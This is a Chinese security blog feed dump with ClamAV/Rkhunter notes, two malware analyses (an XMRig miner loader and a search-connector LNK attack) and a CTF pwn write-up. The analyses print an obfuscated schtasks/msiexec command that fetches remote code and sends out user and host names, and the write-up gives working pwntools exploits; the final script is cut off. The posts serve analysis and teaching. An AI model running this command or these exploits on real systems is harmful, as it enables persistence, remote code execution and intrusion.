class="hljs-comment">--dumpcerts   Dump authenticode certificate chain in PE files在PE文件中转储Authenticode证书链</span><br><span class="hljs-comment">--max-scantime=#n   Scan time longer than this will be skipped and assumed clean扫描时间长于此时间将被忽略并认为是干净的</span><br><span class="hljs-comment">--max-filesize=#n   Files larger than this will be skipped and assumed clean大于此大小的文件将被跳过并假定为干净文件</span><br><span class="hljs-comment">--max-scansize=#n   The maximum amount of data to scan for each container file (**)每个容器文件要扫描的最大数据量（**）</span><br><span class="hljs-comment">--max-files=#n   The maximum number of files to scan for each container file (**)每个容器文件要扫描的最大文件数（**）</span><br><span class="hljs-comment">--max-recursion=#n   Maximum archive recursion level for container file (**)容器文件的最大归档递归级别（**）</span><br><span class="hljs-comment">--max-dir-recursion=#n   Maximum directory recursion level最大目录递归级别</span><br><span class="hljs-comment">--max-embeddedpe=#n   Maximum size file to check for embedded PE检查嵌入式PE的最大大小文件</span><br><span class="hljs-comment">--max-htmlnormalize=#n   Maximum size of HTML file to normalize要规范化的HTML文件的最大大小</span><br><span class="hljs-comment">--max-htmlnotags=#n   Maximum size of normalized HTML file to scan要扫描的规范化HTML文件的最大大小</span><br><span class="hljs-comment">--max-scriptnormalize=#n   Maximum size of script file to normalize要规范化的脚本文件的最大大小</span><br><span class="hljs-comment">--max-ziptypercg=#n   Maximum size zip to type reanalyze邮编的最大大小可重新分析</span><br><span class="hljs-comment">--max-partitions=#n   Maximum number of partitions in disk image to be scanned磁盘映像中要扫描的最大分区数</span><br><span class="hljs-comment">--max-iconspe=#n   Maximum number of icons in PE file to be scannedPE文件中要扫描的最大图标数</span><br><span class="hljs-comment">--max-rechwp3=#n   Maximum recursive calls to HWP3 parsing function对HWP3解析函数的最大递归调用</span><br><span class="hljs-comment">--pcre-match-limit=#n   Maximum calls to the PCRE match function.最多调用PCRE匹配功能。</span><br><span class="hljs-comment">--pcre-recmatch-limit=#n   Maximum recursive calls to the PCRE match function.对PCRE匹配函数的最大递归调用。</span><br><span class="hljs-comment">--pcre-max-filesize=#n   Maximum size file to perform PCRE subsig matching.执行PCRE subsig匹配的最大文件大小。</span><br><span class="hljs-comment">--disable-cache   Disable caching and cache checks for hash sums of scanned files.禁用对扫描文件的哈希和进行缓存和缓存检查。</span><br></code></pre></td></tr></table></figure><h3 id="Ubuntu离线安装"><a href="#Ubuntu离线安装" class="headerlink" title="Ubuntu离线安装"></a>Ubuntu离线安装</h3><p>下载 <a href="https://www.clamav.net/downloads">https://www.clamav.net/downloads</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo dpkg -i  clamav-<span class="hljs-number">1.2</span>.<span class="hljs-number">1</span>.linux.i686.deb<br>sudo mkdir <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/share/</span>clamav<br><br>下载clamav的病毒库，放到上面目录中<br>http:<span class="hljs-regexp">//</span>database.clamav.net/main.cvd<br>http:<span class="hljs-regexp">//</span>database.clamav.net/daily.cvd<br>http:<span class="hljs-regexp">//</span>database.clamav.net/bytecode.cvd<br></code></pre></td></tr></table></figure><p>测试ClamAv查杀率堪忧。</p><p><strong>Avast</strong>、<strong>Avria</strong>（小红伞）、<strong>AVG</strong>相应linux家庭免费版本未找到。</p><p>下一步研究<strong>Chkrootkit</strong>、<strong>Rkhunter</strong>。</p><h3 id="Rkhunter"><a href="#Rkhunter" class="headerlink" title="Rkhunter"></a>Rkhunter</h3><p><a href="https://jaist.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.6/rkhunter-1.4.6.tar.gz%EF%BC%88%E4%B8%8D%E6%8E%A8%E8%8D%90%EF%BC%89">https://jaist.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.6/rkhunter-1.4.6.tar.gz（不推荐）</a></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> rkhunter<br>sudo apt download rkhunter<br>sudo dpkg -i rkhun*<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tar</span> -zxf rkhunter-<span class="hljs-number">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">6</span>.tar.gz<br><span class="hljs-attribute">cd</span> rkhunter-<span class="hljs-number">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">6</span><br><span class="hljs-attribute">sudo</span> ./installer.sh --install<br><span class="hljs-attribute">sudo</span> rkhunter --version<br><span class="hljs-attribute">sudo</span> rkhunter -c --sk<br><span class="hljs-attribute">sudo</span> cat /var/log/rkhunter.log | grep Warning &gt; <span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ClamAV</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>77oracle挖矿木马分析</title>
    <link href="/2023/09/19/77oracle%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"/>
    <url>/2023/09/19/77oracle%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="77-oracle-exe"><a href="#77-oracle-exe" class="headerlink" title="$77_oracle.exe"></a>$77_oracle.exe</h2><h3 id="样本基本信息"><a href="#样本基本信息" class="headerlink" title="样本基本信息"></a>样本基本信息</h3><img src="image-20230905100132892.png" alt="image-20230905100132892" style="zoom:80%;" /><p><img src="/2023/09/19/77oracle%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20230905100259171.png" alt="image-20230905100259171"></p><p>可以看出样本为64位PE文件，使用C++语言，编译器为VS2019。文件MD5：3b89f9f1e9932eee5a031b0266894f5f</p><h3 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h3><p>版本信息显示为 <strong>XMRig&#x2F;6.15.2 MSVC&#x2F;2019</strong>，矿池地址为5.133.65.54:80</p><img src="win10_1903_x64.jpg" alt="win10_1903_x64"  /><p>原版XMRig  <a href="https://github.com/xmrig/xmrig/releases">https://github.com/xmrig/xmrig/releases</a></p><p><a href="https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-msvc-win64.zip">https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-msvc-win64.zip</a></p><p>左边为$77_oracle.exe，右边为xmrig.exe(xmrig-6.15.2-msvc-win64)。可以看出main函数基本一致，应该是由此版本修改编译得到的。</p><p>编译文档  <a href="https://xmrig.com/docs/miner/build/windows">https://xmrig.com/docs/miner/build/windows</a> </p><p><img src="/2023/09/19/77oracle%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20230905100557005.png" alt="image-20230905100557005"></p><p>内存中加载的config，矿池地址为5.133.65.54:80</p><p><img src="/2023/09/19/77oracle%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20230906144528486.png" alt="image-20230906144528486"></p><h2 id="77-Loader-exe"><a href="#77-Loader-exe" class="headerlink" title="$77_Loader.exe"></a>$77_Loader.exe</h2><h3 id="样本基本信息-1"><a href="#样本基本信息-1" class="headerlink" title="样本基本信息"></a>样本基本信息</h3><img src="image-20230907132142104.png" alt="image-20230907132142104" style="zoom:80%;" /><p><img src="/2023/09/19/77oracle%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20230907132434816.png" alt="image-20230907132434816"></p><p>可以看出样本为64位PE文件，使用.net框架编译，存在Smart Assembly混淆。文件MD5：6F593DBEA0A8703AF52BD66F582251A4</p><h3 id="样本分析-1"><a href="#样本分析-1" class="headerlink" title="样本分析"></a>样本分析</h3><p>首先使用de4dot去混淆，再使用dnspy进行反编译，分析</p><p>主函数</p><p><img src="/2023/09/19/77oracle%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20230907134604164.png" alt="image-20230907134604164"></p><p>剩下的懒得看了，就是加载资源解密，然后执行解密的powershell代码。</p><p><img src="/2023/09/19/77oracle%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20230907135020061.png" alt="image-20230907135020061"></p><p>直接定位到   <em><strong>Error executing script.</strong></em></p><p><img src="/2023/09/19/77oracle%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20230907140215501.png" alt="image-20230907140215501"></p><p>在这里下断点就可以看见要执行的powershell了，可以选择保存进行分析。</p><img src="image-20230918095119917.png" alt="image-20230918095119917" style="zoom:80%;" /><p>执行powershell</p><img src="image-20230908145819741.png" alt="image-20230908145819741"  /><h3 id="unsapien提取打包的powershell脚本"><a href="#unsapien提取打包的powershell脚本" class="headerlink" title="unsapien提取打包的powershell脚本"></a>unsapien提取打包的powershell脚本</h3><p>可以看出是使用<strong>SAPIEN PowerShell Studio</strong>打包</p><p>提取powershell代码工具  <a href="https://github.com/dfir-it/unsapien">https://github.com/dfir-it/unsapien</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2 unsapien<span class="hljs-selector-class">.py</span> <span class="hljs-number">77</span>_loader<span class="hljs-selector-class">.exe</span> &gt;<span class="hljs-number">1</span><span class="hljs-selector-class">.txt</span>     <span class="hljs-comment">//代码太长，保存到文件1.txt</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/19/77oracle%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20230907103515139.png" alt="image-20230907103515139"></p><p>奇安信攻防社区的一篇文章，也是通过sapien打包powershell脚本生成的可执行文件  <a href="https://forum.butian.net/share/2340">https://forum.butian.net/share/2340</a></p><h2 id="OracleLoader-ps1"><a href="#OracleLoader-ps1" class="headerlink" title="OracleLoader.ps1"></a>OracleLoader.ps1</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Configuration:</span><br><span class="hljs-attr">Title                            :</span> <span class="hljs-string">Loader</span><br><span class="hljs-attr">Initial Folder                   :</span> <br><span class="hljs-attr">COM Object Path                  :</span> <br><span class="hljs-attr">Script Engine                    :</span> <span class="hljs-string">SAPIEN</span> <span class="hljs-string">PowerShell</span> <span class="hljs-string">V2</span> <span class="hljs-string">Host</span> <span class="hljs-string">(Silent)</span> <span class="hljs-string">x64</span><br><span class="hljs-attr">Leave Data Files                 :</span> <span class="hljs-literal">False</span><br><span class="hljs-attr">Leave Script Files               :</span> <span class="hljs-literal">False</span><br><span class="hljs-attr">Leave COM Objects                :</span> <span class="hljs-literal">False</span><br><span class="hljs-attr">Run Parallel                     :</span> <span class="hljs-literal">False</span><br><span class="hljs-attr">Folder Settings                  :</span> <span class="hljs-number">0</span><br><span class="hljs-attr">UserID                           :</span> <br><span class="hljs-attr">Password                         :</span> <br><span class="hljs-attr">Alternate Credentials            :</span> <span class="hljs-string">Current</span> <span class="hljs-string">user</span><br><span class="hljs-attr">Trial Mode                       :</span> <span class="hljs-literal">False</span><br><span class="hljs-attr">Options                          :</span> <span class="hljs-number">101</span><br><span class="hljs-attr">MTA Mode                         :</span> <span class="hljs-literal">True</span><br><span class="hljs-attr">Execution restrictions           :</span> <span class="hljs-literal">False</span><br><span class="hljs-attr">Allow only single instance       :</span> <span class="hljs-literal">True</span><br><span class="hljs-attr">Check EnableScriptBlockLogging   :</span> <span class="hljs-literal">False</span><br><span class="hljs-attr">Disable EnableScriptBlockLogging :</span> <span class="hljs-literal">True</span><br><span class="hljs-attr">Disable EnableTranscripting      :</span> <span class="hljs-literal">True</span><br><span class="hljs-attr">Use AES                          :</span> <span class="hljs-literal">False</span><br><span class="hljs-attr">Trial Mode Day                   :</span> <span class="hljs-number">0</span><br><span class="hljs-attr">Trial Mode Month                 :</span> <span class="hljs-number">0</span><br><span class="hljs-attr">Trial Mode Year                  :</span> <span class="hljs-number">0</span><br><span class="hljs-attr">Script name                      :</span> <span class="hljs-string">OracleLoader.ps1</span><br><span class="hljs-attr">Allowed OS version               :</span> <br><span class="hljs-attr">Allowed users                    :</span> <br><span class="hljs-attr">Allowed hostnames                :</span> <br><span class="hljs-attr">Allowed MAC addresses            :</span> <br><span class="hljs-attr">Allowed domains                  :</span> <br><br><span class="hljs-attr">Script:</span> <span class="hljs-string">OracleLoader.ps1</span> [<span class="hljs-string">b2823679fc85abd40d50cc1bec18ce4bc803fc78e2597a92c32dec4ff63ffcaf</span>]<br></code></pre></td></tr></table></figure><p>太长了随便看看了看，感觉与cspsvc.ps1相似，不上分析了，可以参见参考。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/system/337691.html">https://www.freebuf.com/articles/system/337691.html</a></p><p><a href="https://www.anquanke.com/post/id/153070">https://www.anquanke.com/post/id/153070</a></p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>77oracle挖矿</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搜索连接器——疑似蔓灵花恶意文件</title>
    <link href="/2023/09/06/%E6%90%9C%E7%B4%A2%E8%BF%9E%E6%8E%A5%E5%99%A8%E2%80%94%E2%80%94%E7%96%91%E4%BC%BC%E8%94%93%E7%81%B5%E8%8A%B1%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/"/>
    <url>/2023/09/06/%E6%90%9C%E7%B4%A2%E8%BF%9E%E6%8E%A5%E5%99%A8%E2%80%94%E2%80%94%E7%96%91%E4%BC%BC%E8%94%93%E7%81%B5%E8%8A%B1%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>恶意文件基本情况如下：</p><p><img src="/2023/09/06/%E6%90%9C%E7%B4%A2%E8%BF%9E%E6%8E%A5%E5%99%A8%E2%80%94%E2%80%94%E7%96%91%E4%BC%BC%E8%94%93%E7%81%B5%E8%8A%B1%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/image-20230906095620302.png" alt="image-20230906095620302"></p><p><img src="/2023/09/06/%E6%90%9C%E7%B4%A2%E8%BF%9E%E6%8E%A5%E5%99%A8%E2%80%94%E2%80%94%E7%96%91%E4%BC%BC%E8%94%93%E7%81%B5%E8%8A%B1%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/image-20230906095704092.png" alt="image-20230906095704092"></p><p>文件为搜索连接器文件 (.searchConnector-ms)，官方文档：</p><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/search/search-sconn-desc-schema-entry#what-are-search-connectors">https://learn.microsoft.com/zh-cn/windows/win32/search/search-sconn-desc-schema-entry#what-are-search-connectors</a></p><p>可以看出攻击者针对的是win10以上系统用户</p><p><img src="/2023/09/06/%E6%90%9C%E7%B4%A2%E8%BF%9E%E6%8E%A5%E5%99%A8%E2%80%94%E2%80%94%E7%96%91%E4%BC%BC%E8%94%93%E7%81%B5%E8%8A%B1%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/image-20230906095732908.png" alt="image-20230906095732908"></p><p>文件会通过Windows资源管理器请求远程地址htt^p:&#x2F;&#x2F;atocguserservice.com&#x2F;res2&#x2F;2&#x2F;1&#x2F; 获取下一步的病毒文件</p><p><img src="/2023/09/06/%E6%90%9C%E7%B4%A2%E8%BF%9E%E6%8E%A5%E5%99%A8%E2%80%94%E2%80%94%E7%96%91%E4%BC%BC%E8%94%93%E7%81%B5%E8%8A%B1%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/image-20230906095753681.png" alt="image-20230906095753681"></p><p><img src="/2023/09/06/%E6%90%9C%E7%B4%A2%E8%BF%9E%E6%8E%A5%E5%99%A8%E2%80%94%E2%80%94%E7%96%91%E4%BC%BC%E8%94%93%E7%81%B5%E8%8A%B1%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="屏幕截图"></p><p>获取的rar中包含docx文件，但是文件实际为纯文本    <em><strong>THIS IS A README FILE</strong></em>。</p><p>恶意文件功能主要集中在LNK文件，其中包含恶意cmd命令（同蔓灵花CHM文件执行的命令）</p><figure class="highlight parser3"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs parser3"><span class="language-xml">schtasks /create /sc minute /mo </span><span class="hljs-number">15</span><span class="language-xml"> /f /tn EdgeUpdates /tr &quot;%coMSPec% /c s</span><span class="hljs-keyword">^ta</span><span class="hljs-keyword">^rt</span><span class="language-xml"> /</span><span class="hljs-keyword">^m</span><span class="hljs-keyword">^i</span><span class="hljs-keyword">^n</span><span class="language-xml"> m</span><span class="hljs-keyword">^s</span><span class="hljs-keyword">^i</span><span class="hljs-keyword">^e</span><span class="hljs-keyword">^xe</span><span class="hljs-keyword">^c</span><span class="language-xml"> ^/</span><span class="hljs-keyword">^i</span><span class="language-xml">  h</span><span class="hljs-keyword">^tt</span><span class="hljs-keyword">^p:</span><span class="language-xml">//</span><span class="hljs-keyword">^w</span><span class="hljs-keyword">^e</span><span class="hljs-keyword">^b</span><span class="hljs-keyword">^a</span><span class="hljs-keyword">^n</span><span class="hljs-keyword">^d</span><span class="hljs-keyword">^e</span><span class="hljs-keyword">^r</span><span class="hljs-keyword">^s</span><span class="hljs-keyword">^o</span><span class="hljs-keyword">^n</span><span class="hljs-keyword">^d</span><span class="hljs-keyword">^e</span><span class="hljs-keyword">^s</span><span class="hljs-keyword">^i</span><span class="hljs-keyword">^g</span><span class="hljs-keyword">^n.</span><span class="hljs-keyword">^c</span><span class="hljs-keyword">^o</span><span class="hljs-keyword">^m</span><span class="language-xml">/</span><span class="hljs-keyword">^z</span><span class="hljs-keyword">^a</span><span class="hljs-keyword">^r</span><span class="hljs-keyword">^a</span><span class="language-xml">/jkl.p</span><span class="hljs-keyword">^h</span><span class="hljs-keyword">^p</span><span class="language-xml">?p</span><span class="hljs-keyword">^i</span><span class="language-xml">=%username%*%computername% /</span><span class="hljs-keyword">^q</span><span class="hljs-keyword">^n</span><span class="language-xml"> ^/</span><span class="hljs-keyword">^norestart</span><span class="language-xml">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/06/%E6%90%9C%E7%B4%A2%E8%BF%9E%E6%8E%A5%E5%99%A8%E2%80%94%E2%80%94%E7%96%91%E4%BC%BC%E8%94%93%E7%81%B5%E8%8A%B1%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/image-20230906100133512.png" alt="image-20230906100133512"></p><p>创建EdgeUpdates计划任务</p><p><img src="/2023/09/06/%E6%90%9C%E7%B4%A2%E8%BF%9E%E6%8E%A5%E5%99%A8%E2%80%94%E2%80%94%E7%96%91%E4%BC%BC%E8%94%93%E7%81%B5%E8%8A%B1%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/image-20230906100224267.png" alt="image-20230906100224267"></p><p>同样单次请求失败</p><p><em>新手法新方式免杀隐蔽性OK</em></p><p><strong>IOCs：</strong></p><p>7A956665925548CC805A4EA090B0341A</p><p>webandersondesign.com</p><p>atocguserservice.com</p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>搜索连接器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buuctf-pwn</title>
    <link href="/2023/05/04/buuctf-pwn/"/>
    <url>/2023/05/04/buuctf-pwn/</url>
    
    <content type="html"><![CDATA[<h3 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h3><h4 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h4><p>利用printf获取上个栈帧的ebp：<strong>printf遇到 <em>\x00</em> 就会截断，如果我们输入的内容正好把ebp前面的区域完全覆盖，就可以带出ebp。</strong></p><p>上个栈帧的ebp(0xffffdo58)到输入s(0xffffd020)的距离是0x38。</p><p><img src="/2023/05/04/buuctf-pwn/image-20230412213112544.png" alt="image-20230412213112544"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>,arch = <span class="hljs-string">&#x27;i386&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./ciscn&#x27;</span>)<br><span class="hljs-comment">#p=remote(&quot;node4.buuoj.cn&quot;,25506)</span><br>system=<span class="hljs-number">0x08048400</span><br>leave_ret=<span class="hljs-number">0x080484b8</span><br><br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x24</span>+<span class="hljs-string">b&#x27;bbbb&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>ebp_addr=u32(p.recv(<span class="hljs-number">4</span>))<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(system)+p32(<span class="hljs-number">0</span>)+p32(ebp_addr-<span class="hljs-number">0x28</span>)+<span class="hljs-string">b&quot;/bin/sh&quot;</span><br>payload=payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=p32(ebp_addr-<span class="hljs-number">0x38</span>)+p32(leave_ret)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h3><h4 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h4><p><em>sys_write(1u, buf, 0x30uLL)</em>     buf的长度为0x10，所以可以带出栈中的数据。减去offset 0x118得到buff的栈地址</p><img src="image-20230413171615705.png" alt="image-20230413171615705" style="zoom:80%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn  <span class="hljs-keyword">import</span>*<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br><br>p=process(<span class="hljs-string">&#x27;./ci&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,27793)</span><br>p.sendline(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0x4004ed</span>))<br>p.recv(<span class="hljs-number">0x20</span>)<br>addr=u64(p.recv(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(addr))<br>addr1=addr-<span class="hljs-number">0x118</span><br><br>frame = SigreturnFrame()<br>frame.rax = constants.SYS_execve<br>frame.rdi = addr1<br>frame.rsi = <span class="hljs-number">0</span><br>frame.rdx =<span class="hljs-number">0</span><br>frame.rip=<span class="hljs-number">0x400517</span><br><br>paylaod = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> *<span class="hljs-number">2</span> + p64(<span class="hljs-number">0x4004da</span>) + p64(<span class="hljs-number">0x400501</span>) + <span class="hljs-built_in">bytes</span>(frame)<br>p.sendline(paylaod)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h3><h4 id="unsorted-bin-attack、fastbiin-attack"><a href="#unsorted-bin-attack、fastbiin-attack" class="headerlink" title="unsorted bin attack、fastbiin attack"></a>unsorted bin attack、fastbiin attack</h4><p><a href="https://cloud.tencent.com/developer/article/1764339">https://cloud.tencent.com/developer/article/1764339</a></p><p><strong>思路：</strong></p><p>​<strong>首先使用堆溢出以及unsortedbin attack得到libc加载</strong></p><ol><li><p>申请5个 chunk，chunk0用于修改chunk1、2，chunk1、2通过free将chunk4带入fastbin，chunk3用于修改chunk4；</p></li><li><p>free chunk1、2，通过修改chunk0将chunk2，4加入fastbin，并通过chunk3修改chunk4大小（为了成功将chunk4从fastbin种申请出来）；</p></li><li><p>从fastbin申请出来chunk4，此是index&#x3D;2，index2，size&#x3D;0x10和index4，size&#x3D;0x80指向同一地址；</p></li><li><p>将index4 size位还原0x91，free index4进入unsortedbin，fd、bk都指向main_arena + 0x58；</p></li><li><p>因为inde2指向index4所以，输出index2就可以得到main_arena + 0x58地址，通过偏移就可以算出libc基址；</p><p><img src="/2023/05/04/buuctf-pwn/image-20230414095013669.png" alt="image-20230414095013669"></p><p>此时堆情况如下，<strong>然后使用fastbin attack修改malloc_hook</strong></p><p><img src="/2023/05/04/buuctf-pwn/image-20230414102732522.png" alt="image-20230414102732522"></p></li><li><p>重新申请index4，size 0x60，然后将其free进入fastbin，再次使用index2的指针向index4写入malloc_hook-0x23，将fake chunk加入fastbin；</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">readelf -s libc-2.23.so|grep malloc_hook<br></code></pre></td></tr></table></figure></li><li><p>申请两次得到fake chunk，向fake chunk写入onegadget，实现劫持malloc；</p></li><li><p>执行malloc，实际执行onegadget。</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span 